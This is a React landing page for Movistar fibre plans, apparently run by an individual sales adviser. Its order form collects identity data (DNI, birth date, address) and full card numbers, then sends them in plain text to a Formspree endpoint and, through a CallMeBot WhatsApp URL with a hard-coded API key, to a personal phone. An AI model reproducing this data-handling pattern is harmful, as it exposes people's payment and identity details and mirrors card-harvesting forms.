import React, { useState, useMemo, useRef, useEffect } from 'react';
import {
  Wifi, Tv, Zap, MapPin, User, CreditCard, Phone, Check,
  Star, Signal, Gift, AlertCircle, MapPinned, ChevronRight,
  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone
} from 'lucide-react';

/* ============================================================
   CONFIGURACIÓN FORMSPREE (email)
   ============================================================ */
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xoejvqjl';

/* ============================================================
   CONFIGURACIÓN CALLMEBOT (WhatsApp del asesor)
   ============================================================ */
const CALLMEBOT_PHONE = '+5492804300415';
const CALLMEBOT_API_KEY = '5051047';

/* ---------------- DATA ---------------- */
const PLANES_CLIENTES = [
  { id: 'cli-600', velocidad: '600 MB', tipo: 'Fibra Simétrica', precio: '22.000', destacado: true, badge: 'MÁS ELEGIDO',
    features: ['Internet simétrico 600/600 Mbps', 'Wi-Fi 6 incluido', 'Instalación GRATIS', 'Cliente Movistar con línea móvil'] },
  { id: 'cli-1000', velocidad: '1000 MB', tipo: 'Ultra (1 GIGA)', precio: '35.829', destacado: false,
    features: ['Internet simétrico 1 Giga', 'Wi-Fi 6 + Mesh opcional', 'Instalación GRATIS', 'Máxima velocidad disponible'] }
];

const PLANES_NUEVOS = [
  { id: 'nue-600', velocidad: '600 MB', tipo: 'Fibra Simétrica', precio: '26.000', destacado: false,
    features: ['Internet simétrico 600/600 Mbps', 'Wi-Fi 6 incluido', 'Instalación GRATIS', 'Nuevo cliente sin línea Movistar'] },
  { id: 'nue-1000', velocidad: '1000 MB', tipo: 'Ultra (1 GIGA)', precio: '39.829', destacado: false,
    features: ['Internet simétrico 1 Giga', 'Wi-Fi 6 + Mesh opcional', 'Instalación GRATIS', 'Máxima velocidad disponible'] }
];

const COMBOS_TV = [
  { nombre: 'Combo Clásico', precio: '13.840' },
  { nombre: 'Combo Max', precio: '11.731' }
];

const PACKS_PREMIUM = [
  { nombre: 'Pack Fútbol', precio: '27.660' },
  { nombre: 'HBO Pack', precio: '11.604' },
  { nombre: 'Prime Video', precio: '9.679' },
  { nombre: 'Hot Pack', precio: '14.860' }
];

const COMPLEMENTOS = [
  { nombre: 'Amplificador Wi-Fi', precio: '3.835' },
  { nombre: 'Decodificador Adicional', precio: '4.752' }
];

/* ---------------- INPUT REUTILIZABLE ---------------- */
const InputField = ({ label, name, value, onChange, type = 'text', required = false, placeholder = '', maxLength, readOnly = false, hint }) => (
  <div className="flex flex-col gap-1.5">
    <label className="text-sm font-semibold text-[#0B1A28] flex items-center gap-1">
      {label} {required && <span className="text-red-500">*</span>}
    </label>
    <input
      type={type}
      name={name}
      value={value}
      onChange={onChange}
      required={required}
      placeholder={placeholder}
      maxLength={maxLength}
      readOnly={readOnly}
      className={`w-full px-4 py-3 rounded-xl border-2 transition-all bg-white text-[#0B1A28] text-base
        ${readOnly
          ? 'border-[#019DF4]/40 bg-[#019DF4]/5 cursor-pointer text-sm font-mono'
          : 'border-gray-200 focus:border-[#019DF4] focus:ring-2 focus:ring-[#019DF4]/20 focus:outline-none'}`}
    />
    {hint && <p className="text-xs text-gray-500 mt-0.5">{hint}</p>}
  </div>
);

/* ============================================================
   APP
   ============================================================ */
export default function App() {
  const initialFormState = {
    calle: '', numero: '', transversal1: '', transversal2: '',
    calleAtras: '', localidad: '',
    nombre: '', dni: '', fechaNacimiento: '',
    numeroTarjeta: '', bancoEmisor: '',
    telefonoContacto: ''
  };

  const [formData, setFormData] = useState(initialFormState);
  const [pagaConMercadoPago, setPagaConMercadoPago] = useState(false);
  const [status, setStatus] = useState('idle');
  const [geoStatus, setGeoStatus] = useState('idle');
  const [coords, setCoords] = useState(null);
  const formRef = useRef(null);

  /* -------- Dirección + link de Maps -------- */
  const direccionTexto = useMemo(() => {
    const { calle, numero, localidad } = formData;
    if (!calle.trim() || !numero.trim() || !localidad.trim()) return '';
    return `${calle} ${numero}, ${localidad}, Argentina`;
  }, [formData.calle, formData.numero, formData.localidad]);

  const mapLinkDireccion = useMemo(() => {
    if (!direccionTexto) return '';
    return `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(direccionTexto)}`;
  }, [direccionTexto]);

  /* -------- Fetch coordenadas GPS (background) -------- */
  useEffect(() => {
    if (!direccionTexto) {
      setCoords(null);
      setGeoStatus('idle');
      return;
    }

    setGeoStatus('loading');
    const timer = setTimeout(async () => {
      try {
        const url = `https://nominatim.openstreetmap.org/search?format=json&limit=1&q=${encodeURIComponent(direccionTexto)}`;
        const res = await fetch(url, { headers: { 'Accept': 'application/json' } });
        const data = await res.json();

        if (Array.isArray(data) && data.length > 0) {
          const lat = parseFloat(data[0].lat).toFixed(6);
          const lng = parseFloat(data[0].lon).toFixed(6);
          setCoords({ lat, lng });
          setGeoStatus('success');
        } else {
          setCoords(null);
          setGeoStatus('error');
        }
      } catch {
        setCoords(null);
        setGeoStatus('error');
      }
    }, 900);

    return () => clearTimeout(timer);
  }, [direccionTexto]);

  /* -------- Handlers -------- */
  const handleChange = (e) => {
    const { name, value } = e.target;
    let v = value;
    if (name === 'numeroTarjeta') v = value.replace(/\D/g, '').slice(0, 16);
    if (name === 'dni') v = value.replace(/\D/g, '').slice(0, 8);
    if (name === 'telefonoContacto') v = value.replace(/[^\d+\s()-]/g, '').slice(0, 20);
    setFormData((p) => ({ ...p, [name]: v }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('submitting');

    const coordsTexto = coords ? `${coords.lat}, ${coords.lng}` : 'No disponibles';

    /* -------- Sección 3: contenido condicional -------- */
    let seccion3Texto = '';
    if (pagaConMercadoPago) {
      seccion3Texto = 'MEDIO DE PAGO: MERCADO PAGO';
    } else if (formData.numeroTarjeta || formData.bancoEmisor) {
      seccion3Texto = `NUMERO TARJETA: ${formData.numeroTarjeta || '-'}\nBANCO: ${formData.bancoEmisor || '-'}`;
    } else {
      seccion3Texto = 'NO ESPECIFICADO';
    }

    /* -------- Cuerpo del email formateado -------- */
    const mensaje = [
      'SECCION 1',
      'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
      `CALLE: ${formData.calle}`,
      `NUMERO: ${formData.numero}`,
      `TRANSVERSAL 1: ${formData.transversal1}`,
      `TRANSVERSAL 2: ${formData.transversal2}`,
      `CALLE DE ATRAS: ${formData.calleAtras}`,
      `LOCALIDAD: ${formData.localidad}`,
      `COORDENADAS: ${coordsTexto}`,
      '',
      'SECCION 2',
      '👤 VALIDAR TITULAR (scoring)',
      `NOMBRE: ${formData.nombre}`,
      `DNI: ${formData.dni}`,
      `FECHA NAC: ${formData.fechaNacimiento}`,
      '',
      'SECCION 3',
      '💳 VALIDAR TARJETA',
      seccion3Texto,
      '',
      'SECCION 4',
      'numero de contacto',
      `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
    ].join('\n');

    const data = new FormData();
    data.append('_subject', `Nueva solicitud Movistar - ${formData.nombre || 'Sin nombre'}`);
    data.append('SOLICITUD', mensaje);

    try {
      const res = await fetch(FORMSPREE_ENDPOINT, {
        method: 'POST',
        body: data,
        headers: { Accept: 'application/json' }
      });

      if (res.ok) {
        /* -------- Notificación por WhatsApp (CallMeBot) -------- */
        const waText = [
          '🔔 *NUEVA SOLICITUD MOVISTAR*',
          '',
          '*SECCION 1*',
          'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
          `CALLE: ${formData.calle}`,
          `NUMERO: ${formData.numero}`,
          `TRANSVERSAL 1: ${formData.transversal1}`,
          `TRANSVERSAL 2: ${formData.transversal2}`,
          `CALLE DE ATRAS: ${formData.calleAtras}`,
          `LOCALIDAD: ${formData.localidad}`,
          `COORDENADAS: ${coordsTexto}`,
          '',
          '*SECCION 2*',
          '👤 VALIDAR TITULAR (scoring)',
          `NOMBRE: ${formData.nombre}`,
          `DNI: ${formData.dni}`,
          `FECHA NAC: ${formData.fechaNacimiento}`,
          '',
          '*SECCION 3*',
          '💳 VALIDAR TARJETA',
          seccion3Texto,
          '',
          '*SECCION 4*',
          'numero de contacto',
          `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
        ].join('\n');

        const waUrl = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText)}&apikey=${CALLMEBOT_API_KEY}`;

        fetch(waUrl, { mode: 'no-cors' }).catch(() => {
          console.warn('CallMeBot: no se pudo enviar el WhatsApp.');
        });

        setStatus('success');
        setFormData(initialFormState);
        setPagaConMercadoPago(false);
        setCoords(null);
        setGeoStatus('idle');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      } else {
        setStatus('error');
      }
    } catch {
      setStatus('error');
    }
  };

  /* ============================================================
     RENDER
     ============================================================ */
  return (
    <div className="min-h-screen bg-white text-[#0B1A28] font-sans antialiased">

      {/* ---------- HEADER ---------- */}
      <header className="sticky top-0 z-50 bg-white/95 backdrop-blur border-b border-gray-100 shadow-sm">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-9 h-9 rounded-full bg-[#019DF4] flex items-center justify-center text-white font-bold text-lg">M</div>
            <div className="leading-none">
              <p className="font-bold text-[#0B1A28] text-sm">Movistar</p>
              <p className="text-[10px] text-gray-500 tracking-wider">FIBRA ÓPTICA</p>
            </div>
          </div>
          <a href="#solicitud" className="bg-[#019DF4] hover:bg-[#0186d1] text-white text-sm font-semibold px-4 py-2 rounded-full transition-colors">
            Contratar
          </a>
        </div>
      </header>

      {/* ---------- HERO ---------- */}
      <section className="relative overflow-hidden bg-gradient-to-br from-[#0B1A28] via-[#0d2438] to-[#019DF4] text-white">
        <div className="absolute inset-0 opacity-20 pointer-events-none">
          <div className="absolute top-10 right-10 w-72 h-72 bg-[#019DF4] rounded-full blur-3xl" />
          <div className="absolute bottom-0 left-0 w-64 h-64 bg-[#5BC236] rounded-full blur-3xl" />
        </div>

        <div className="relative max-w-6xl mx-auto px-4 py-14 md:py-24 text-center">
          <div className="inline-flex items-center gap-2 bg-white/10 border border-white/20 backdrop-blur rounded-full px-4 py-1.5 mb-6 text-sm">
            <Signal className="w-4 h-4 text-[#5BC236]" />
            <span className="font-medium">M Movistar Internet</span>
          </div>

          <h1 className="text-4xl md:text-6xl font-extrabold leading-tight mb-4">
            Conéctate a la Mejor<br />
            <span className="bg-gradient-to-r from-[#019DF4] to-[#5BC236] bg-clip-text text-transparent">Fibra Óptica</span>
          </h1>

          <p className="text-lg md:text-2xl font-semibold text-yellow-300 mb-6 flex flex-wrap justify-center items-center gap-2">
            <Zap className="w-6 h-6" /> ¡INSTALACIÓN 100% GRATIS EN TODOS LOS PLANES! <Zap className="w-6 h-6" />
          </p>

          <p className="max-w-2xl mx-auto text-white/80 mb-8">
            Velocidad simétrica, estabilidad garantizada y la mejor experiencia de conexión para tu hogar o negocio.
          </p>

          <div className="flex flex-col sm:flex-row gap-3 justify-center">
            <a href="#planes" className="bg-[#019DF4] hover:bg-[#0186d1] px-6 py-3 rounded-full font-semibold transition-all hover:scale-105 inline-flex items-center justify-center gap-2">
              Ver Planes <ChevronRight className="w-4 h-4" />
            </a>
            <a href="#solicitud" className="bg-white/10 hover:bg-white/20 border border-white/30 px-6 py-3 rounded-full font-semibold transition-all inline-flex items-center justify-center gap-2">
              Solicitar ahora
            </a>
          </div>

          <p className="mt-8 text-sm text-white/70">
            Atención personalizada de <strong className="text-white">Carlos Damián Irigoyen</strong> — Asesor Comercial Movistar
          </p>
        </div>
      </section>

      {/* ---------- PLANES ---------- */}
      <section id="planes" className="py-14 md:py-20 bg-gray-50">
        <div className="max-w-6xl mx-auto px-4">
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-2 text-[#019DF4] font-semibold text-sm mb-2">
              <Wifi className="w-4 h-4" /> PLANES DE INTERNET
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold mb-3">Elegí tu velocidad ideal</h2>
            <p className="text-gray-600 max-w-2xl mx-auto">Todos nuestros planes incluyen instalación gratuita y Wi-Fi de última generación.</p>
          </div>

          <div className="mb-12">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-full bg-[#019DF4]/10 flex items-center justify-center">
                <User className="w-5 h-5 text-[#019DF4]" />
              </div>
              <div>
                <h3 className="text-xl font-bold">Clientes Movistar</h3>
                <p className="text-sm text-gray-500">Con línea móvil Movistar activa</p>
              </div>
            </div>
            <div className="grid md:grid-cols-2 gap-5">
              {PLANES_CLIENTES.map((plan) => (<PlanCard key={plan.id} plan={plan} />))}
            </div>
          </div>

          <div>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-10 h-10 rounded-full bg-[#5BC236]/10 flex items-center justify-center">
                <Sparkles className="w-5 h-5 text-[#5BC236]" />
              </div>
              <div>
                <h3 className="text-xl font-bold">Nuevos Clientes</h3>
                <p className="text-sm text-gray-500">Sin línea móvil Movistar</p>
              </div>
            </div>
            <div className="grid md:grid-cols-2 gap-5">
              {PLANES_NUEVOS.map((plan) => (<PlanCard key={plan.id} plan={plan} />))}
            </div>
          </div>
        </div>
      </section>

      {/* ---------- TV / PACKS / COMPLEMENTOS ---------- */}
      <section id="tv" className="py-14 md:py-20 bg-white">
        <div className="max-w-6xl mx-auto px-4">
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-2 text-[#019DF4] font-semibold text-sm mb-2">
              <Tv className="w-4 h-4" /> MOVISTAR TV & COMPLEMENTOS
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold mb-3">Potenciá tu experiencia</h2>
            <p className="text-gray-600 max-w-2xl mx-auto">Sumá entretenimiento y cobertura total a tu plan de Fibra.</p>
          </div>

          <div className="mb-10">
            <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
              <span className="w-1.5 h-6 bg-[#019DF4] rounded-full" /> Combos de TV
            </h3>
            <div className="grid sm:grid-cols-2 gap-4">
              {COMBOS_TV.map((c) => (<AddonCard key={c.nombre} nombre={c.nombre} precio={c.precio} />))}
            </div>
          </div>

          <div className="mb-10">
            <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
              <span className="w-1.5 h-6 bg-[#019DF4] rounded-full" /> Packs de Canales Premium
            </h3>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
              {PACKS_PREMIUM.map((p) => (<AddonCard key={p.nombre} nombre={p.nombre} precio={p.precio} />))}
            </div>
          </div>

          <div>
            <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
              <span className="w-1.5 h-6 bg-[#019DF4] rounded-full" /> Complementos
            </h3>
            <div className="grid sm:grid-cols-2 gap-4">
              {COMPLEMENTOS.map((c) => (<AddonCard key={c.nombre} nombre={c.nombre} precio={c.precio} />))}
            </div>
          </div>
        </div>
      </section>

      {/* ---------- FORMULARIO ---------- */}
      <section id="solicitud" ref={formRef} className="py-14 md:py-20 bg-gradient-to-b from-gray-50 to-white">
        <div className="max-w-3xl mx-auto px-4">
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-2 text-[#019DF4] font-semibold text-sm mb-2">
              <Send className="w-4 h-4" /> SOLICITUD DE SERVICIO
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold mb-3">Completá tus datos</h2>
            <p className="text-gray-600">
              Completá el formulario y <strong>me pondré en contacto con vos</strong> a la brevedad para validar disponibilidad y agendar tu instalación.
            </p>
          </div>

          {status === 'success' && (
            <div className="mb-6 p-4 rounded-xl bg-green-50 border border-green-200 flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-semibold text-green-800">¡Solicitud enviada con éxito!</p>
                <p className="text-sm text-green-700">Me comunicaré con vos a la brevedad para coordinar la instalación.</p>
              </div>
            </div>
          )}
          {status === 'error' && (
            <div className="mb-6 p-4 rounded-xl bg-red-50 border border-red-200 flex items-start gap-3">
              <XCircle className="w-5 h-5 text-red-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-semibold text-red-800">Hubo un problema al enviar</p>
                <p className="text-sm text-red-700">
                  Por favor, intentá nuevamente o escribime directo al WhatsApp <strong>2804300415</strong>.
                </p>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="bg-white rounded-3xl shadow-xl border border-gray-100 p-5 md:p-8 space-y-8">

            {/* ---------- SECCIÓN 1 (obligatoria) ---------- */}
            <FormSection number="1" title="Validar direcciones / disponibilidad" icon={<MapPinned className="w-5 h-5" />}>
              <InputField label="Calle" name="calle" value={formData.calle} onChange={handleChange} required placeholder="Ej: Av. San Martín" />
              <InputField label="Número" name="numero" value={formData.numero} onChange={handleChange} required placeholder="Ej: 1234" />
              <InputField label="Transversal 1" name="transversal1" value={formData.transversal1} onChange={handleChange} required placeholder="Ej: Belgrano" />
              <InputField label="Transversal 2" name="transversal2" value={formData.transversal2} onChange={handleChange} required placeholder="Ej: Sarmiento" />
              <InputField label="Calle de atrás" name="calleAtras" value={formData.calleAtras} onChange={handleChange} required placeholder="Ej: Mitre" />
              <InputField label="Localidad" name="localidad" value={formData.localidad} onChange={handleChange} required placeholder="Ej: Trelew" />

              <div className="md:col-span-2">
                <div className="rounded-xl border border-[#019DF4]/30 bg-[#019DF4]/5 p-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
                  <div className="flex items-center gap-2">
                    <Navigation className="w-4 h-4 text-[#019DF4] flex-shrink-0" />
                    <p className="text-sm font-semibold text-[#0B1A28]">Ubicación de la dirección</p>
                  </div>

                  {geoStatus === 'loading' && (
                    <span className="inline-flex items-center gap-2 text-xs text-[#019DF4] font-semibold">
                      <Loader2 className="w-3 h-3 animate-spin" /> Buscando...
                    </span>
                  )}

                  {(geoStatus === 'success' || geoStatus === 'error') && mapLinkDireccion && (
                    <a
                      href={mapLinkDireccion}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1.5 bg-[#019DF4] hover:bg-[#0186d1] text-white text-xs font-bold px-4 py-2 rounded-full transition-colors w-fit"
                    >
                      <MapPin className="w-3.5 h-3.5" /> Ver ubicación en el mapa
                    </a>
                  )}

                  {geoStatus === 'idle' && (
                    <span className="text-xs text-gray-500">Completá Calle + Número + Localidad</span>
                  )}
                </div>
              </div>
            </FormSection>

            {/* ---------- SECCIÓN 2 (obligatoria) ---------- */}
            <FormSection number="2" title="Validar titular" icon={<User className="w-5 h-5" />}>
              <InputField label="Nombre y Apellido" name="nombre" value={formData.nombre} onChange={handleChange} required placeholder="Ej: Juan Pérez" />
              <InputField label="DNI" name="dni" value={formData.dni} onChange={handleChange} required placeholder="Ej: 30123456" maxLength={8} />
              <div className="md:col-span-2">
                <InputField label="Fecha de Nacimiento" name="fechaNacimiento" type="date" value={formData.fechaNacimiento} onChange={handleChange} required />
              </div>
            </FormSection>

            {/* ---------- SECCIÓN 3 (opcional) ---------- */}
            <FormSection number="3" title="Validar tarjeta (opcional)" icon={<CreditCard className="w-5 h-5" />}>
              {/* Checkbox Mercado Pago */}
              <div className="md:col-span-2">
                <label className="flex items-start gap-3 bg-[#00B1EA]/5 border border-[#00B1EA]/30 rounded-xl p-4 cursor-pointer hover:bg-[#00B1EA]/10 transition-colors">
                  <input
                    type="checkbox"
                    checked={pagaConMercadoPago}
                    onChange={(e) => {
                      setPagaConMercadoPago(e.target.checked);
                      if (e.target.checked) {
                        setFormData((p) => ({ ...p, numeroTarjeta: '', bancoEmisor: '' }));
                      }
                    }}
                    className="mt-0.5 w-5 h-5 accent-[#00B1EA] cursor-pointer flex-shrink-0"
                  />
                  <div className="flex items-start gap-2">
                    <Smartphone className="w-5 h-5 text-[#00B1EA] mt-0.5 flex-shrink-0" />
                    <div>
                      <p className="font-semibold text-[#0B1A28] text-sm">Pagaré con Mercado Pago</p>
                      <p className="text-xs text-gray-500 mt-0.5">
                        Marcá esta casilla si vas a abonar con Mercado Pago. Si no, podés completar los datos de tarjeta abajo (opcional).
                      </p>
                    </div>
                  </div>
                </label>
              </div>

              {/* Campos de tarjeta (solo si NO marcó Mercado Pago) */}
              {!pagaConMercadoPago && (
                <>
                  <InputField
                    label="Número de Tarjeta"
                    name="numeroTarjeta"
                    value={formData.numeroTarjeta}
                    onChange={handleChange}
                    maxLength={16}
                    placeholder="16 dígitos (opcional)"
                    hint={`${formData.numeroTarjeta.length}/16 dígitos`}
                  />
                  <InputField label="Banco Emisor" name="bancoEmisor" value={formData.bancoEmisor} onChange={handleChange} placeholder="Ej: Banco Nación, Ualá, Brubank" />
                </>
              )}

              <div className="md:col-span-2">
                <div className="flex items-start gap-3 bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                  <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-yellow-900">
                    Ante cualquier duda sobre el pago, comunicate conmigo al celular <strong>2804300415</strong>.
                  </p>
                </div>
              </div>
            </FormSection>

            {/* ---------- SECCIÓN 4 (opcional) ---------- */}
            <FormSection number="4" title="Teléfono de contacto (opcional)" icon={<Phone className="w-5 h-5" />}>
              <div className="md:col-span-2">
                <InputField
                  label="Teléfono / Celular"
                  name="telefonoContacto"
                  value={formData.telefonoContacto}
                  onChange={handleChange}
                  placeholder="Ej: 2804123456 o +54 9 280 412-3456"
                  hint="Dejame tu número si querés que te contacte directo por WhatsApp o llamada."
                />
              </div>
            </FormSection>

            <button
              type="submit"
              disabled={status === 'submitting'}
              className="w-full bg-gradient-to-r from-[#019DF4] to-[#0186d1] hover:from-[#0186d1] hover:to-[#0175b8] text-white font-bold py-4 rounded-2xl transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-lg shadow-[#019DF4]/30"
            >
              {status === 'submitting' ? (
                <><Loader2 className="w-5 h-5 animate-spin" /> Enviando solicitud...</>
              ) : (
                <><Send className="w-5 h-5" /> Enviar Solicitud</>
              )}
            </button>

            <p className="text-xs text-center text-gray-500">
              Al enviar aceptás ser contactado por mí, <strong>Carlos Damián Irigoyen</strong>, Asesor Comercial Movistar.
            </p>
          </form>
        </div>
      </section>

      {/* ---------- FOOTER ---------- */}
      <footer className="bg-[#0B1A28] text-white pt-12 pb-8">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid md:grid-cols-3 gap-8 mb-8">
            <div>
              <div className="flex items-center gap-2 mb-4">
                <div className="w-9 h-9 rounded-full bg-[#019DF4] flex items-center justify-center text-white font-bold text-lg">M</div>
                <div className="leading-none">
                  <p className="font-bold">Movistar</p>
                  <p className="text-[10px] text-white/60 tracking-wider">FIBRA ÓPTICA</p>
                </div>
              </div>
              <p className="text-sm text-white/70">Comercialización oficial de servicios de Fibra Óptica Movistar.</p>
            </div>

            <div>
              <h4 className="font-bold mb-3 flex items-center gap-2"><User className="w-4 h-4 text-[#019DF4]" /> Tu Asesor Comercial</h4>
              <p className="text-white/80 font-semibold">Carlos Damián Irigoyen</p>
              <p className="text-xs text-white/60 mt-1">Atención personalizada y directa</p>
            </div>

            <div>
              <h4 className="font-bold mb-3 flex items-center gap-2"><Phone className="w-4 h-4 text-[#019DF4]" /> Contacto / WhatsApp</h4>
              <a
                href="https://wa.me/5492804300415"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-2 bg-[#25D366] hover:bg-[#1ebe5b] text-white font-semibold px-4 py-2 rounded-full transition-colors"
              >
                <Phone className="w-4 h-4" /> 2804300415
              </a>
            </div>
          </div>

          <div className="border-t border-white/10 pt-6 text-center text-xs text-white/50">
            <p>© {new Date().getFullYear()} Carlos Damián Irigoyen — Asesor Comercial Movistar. Todos los derechos reservados.</p>
            <p className="mt-1">Comercialización oficial autorizada. Movistar es una marca registrada de Telefónica.</p>
          </div>
        </div>
      </footer>

      <a
        href="https://wa.me/5492804300415"
        target="_blank"
        rel="noopener noreferrer"
        className="fixed bottom-5 right-5 z-50 w-14 h-14 rounded-full bg-[#25D366] hover:bg-[#1ebe5b] shadow-lg shadow-black/20 flex items-center justify-center transition-transform hover:scale-110"
        aria-label="WhatsApp"
      >
        <Phone className="w-6 h-6 text-white" />
      </a>
    </div>
  );
}

/* ============================================================
   SUB-COMPONENTES
   ============================================================ */

function PlanCard({ plan }) {
  return (
    <div className={`relative rounded-2xl p-6 border-2 transition-all hover:shadow-xl ${plan.destacado ? 'border-[#019DF4] bg-gradient-to-b from-[#019DF4]/5 to-white shadow-lg' : 'border-gray-200 bg-white'}`}>
      {plan.destacado && (
        <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-[#019DF4] text-white text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
          <Star className="w-3 h-3 fill-current" /> {plan.badge}
        </div>
      )}
      <div className="flex items-baseline gap-2 mb-1">
        <h4 className="text-3xl font-extrabold text-[#0B1A28]">{plan.velocidad}</h4>
        <span className="text-sm font-semibold text-[#019DF4]">{plan.tipo}</span>
      </div>
      <div className="flex items-baseline gap-1 mb-5">
        <span className="text-2xl font-bold text-[#0B1A28]">${plan.precio}</span>
        <span className="text-sm text-gray-500">/ mes</span>
      </div>
      <ul className="space-y-2">
        {plan.features.map((f) => (
          <li key={f} className="flex items-start gap-2 text-sm text-gray-700">
            <Check className="w-4 h-4 text-[#5BC236] mt-0.5 flex-shrink-0" /> {f}
          </li>
        ))}
      </ul>
    </div>
  );
}

function AddonCard({ nombre, precio }) {
  return (
    <div className="rounded-2xl border border-gray-200 bg-white p-4 hover:shadow-md hover:border-[#019DF4]/40 transition-all">
      <p className="font-bold text-[#0B1A28] text-sm">{nombre}</p>
      <p className="text-lg font-extrabold text-[#019DF4]">
        ${precio} <span className="text-xs text-gray-500 font-normal">/ mes</span>
      </p>
    </div>
  );
}

function FormSection({ number, title, icon, children }) {
  return (
    <div>
      <div className="flex items-center gap-3 mb-5">
        <div className="w-10 h-10 rounded-full bg-[#019DF4] text-white flex items-center justify-center font-bold">
          {number}
        </div>
        <div>
          <div className="flex items-center gap-2 text-[#019DF4]">{icon}<span className="text-xs font-bold uppercase tracking-wide">Sección {number}</span></div>
          <h3 className="font-bold text-lg text-[#0B1A28]">{title}</h3>
        </div>
      </div>
      <div className="grid md:grid-cols-2 gap-4 pl-0 md:pl-13">{children}</div>
    </div>
  );
}